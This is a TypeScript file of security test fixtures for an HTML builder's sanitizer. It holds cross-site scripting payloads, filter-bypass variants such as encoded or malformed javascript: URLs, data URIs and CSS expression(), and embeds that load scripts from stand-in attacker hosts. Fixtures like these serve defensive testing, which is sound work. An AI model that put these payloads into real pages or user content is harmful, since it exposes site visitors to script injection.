/**
 * Security test fixtures mandated by html-visual-builder-spec/docs/09_SECURITY.md (Section 11).
 * Used to verify the sanitizer, URL policy, and import pipeline against XSS, DOM injection,
 * and malicious construct executions.
 */

export const MALICIOUS_SCRIPT_FIXTURE = `
<!DOCTYPE html>
<html>
  <head>
    <title>Malicious Script Test</title>
    <script>alert('pwned-head');</script>
  </head>
  <body>
    <h1>Safe Title</h1>
    <script>alert('pwned-body');</script>
    <script src="https://evil.example.com/exploit.js"></script>
    <p>Safe paragraph text</p>
  </body>
</html>
`;

export const MALICIOUS_EVENT_HANDLER_FIXTURE = `
<div class="card">
  <img src="x" onerror="alert('xss-onerror')">
  <button onclick="alert('xss-onclick')" onmouseover="alert('hover')">Click me</button>
  <input type="text" onfocus="alert('focus')" oninput="alert('input')">
  <svg onload="alert('svg-onload')"></svg>
  <body onload="alert('body-onload')">
</div>
`;

export const MALICIOUS_JAVASCRIPT_URL_FIXTURE = `
<div>
  <a href="javascript:alert(1)">Plain JS URL</a>
  <a href="JAVASCRIPT:alert(2)">Upper JS URL</a>
  <a href="  javascript:alert(3)  ">Whitespace JS URL</a>
  <a href="java\\nscript:alert(4)">Newline JS URL</a>
  <a href="vbscript:msgbox(1)">VBScript URL</a>
  <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Dangerous data HTML</a>
  <iframe src="javascript:alert(5)"></iframe>
</div>
`;

export const MALICIOUS_EMBEDS_FIXTURE = `
<div>
  <iframe src="https://attacker.example.com/phishing"></iframe>
  <object data="https://attacker.example.com/exploit.swf" type="application/x-shockwave-flash"></object>
  <embed src="https://attacker.example.com/exploit.swf">
  <applet code="Malicious.class" width="100" height="100"></applet>
</div>
`;

export const MALICIOUS_MALFORMED_HTML_FIXTURE = `
<div>
  <<SCRIPT>alert("XSS");//<</SCRIPT>
  <img src="/" ="" onerror="alert(1)">
  <a href="jav&#x09;ascript:alert(1)">Entity bypass link</a>
  <div style="background-image: url('javascript:alert(1)');">Exploit in style</div>
  <style>
    body { background: url('javascript:alert(1)'); }
    .bad { width: expression(alert(1)); }
  </style>
</div>
`;

export const SAFE_HTML_FIXTURE = `
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Safe Landing Page</title>
    <meta name="description" content="A completely safe sample landing page">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap">
    <style>
      .hero { color: #1e293b; padding: 24px; font-family: Inter, sans-serif; }
      .btn { background-color: #3b82f6; color: white; padding: 8px 16px; border-radius: 4px; }
    </style>
  </head>
  <body>
    <header class="hero">
      <h1>Welcome to Visual Builder</h1>
      <p>Build responsive pages cleanly.</p>
      <a href="https://example.com/pricing" class="btn">Get Started</a>
      <a href="mailto:support@example.com">Contact Support</a>
      <a href="tel:+1234567890">Call Us</a>
      <a href="#features">Jump to Features</a>
      <img src="https://example.com/logo.png" alt="Company Logo" width="200" height="50">
      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" alt="1px dot">
    </header>
  </body>
</html>
`;
